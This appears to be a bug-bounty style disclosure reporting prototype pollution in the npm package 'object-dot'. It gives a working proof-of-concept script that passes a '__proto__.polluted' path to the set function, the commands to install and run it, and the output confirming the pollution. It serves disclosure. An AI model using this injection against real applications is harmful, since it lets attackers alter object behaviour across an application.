# Description

`object-dot` is vulnerable to `Prototype Pollution`.

# Proof of Concept

1. Create the following PoC file:

```
// poc.js
var objectDot = require("object-dot")
var obj = {}
console.log("Before : " + obj.polluted);
objectDot.set(obj, '__proto__.polluted', 'Yes! Its Polluted');
console.log("After : " + obj.polluted);
```


2. Execute the following commands in terminal:

```
npm i object-dot # Install affected module
node poc.js #  Run the PoC
```

3. Check the Output:
```
Before : undefined
After : Yes! Its Polluted
```
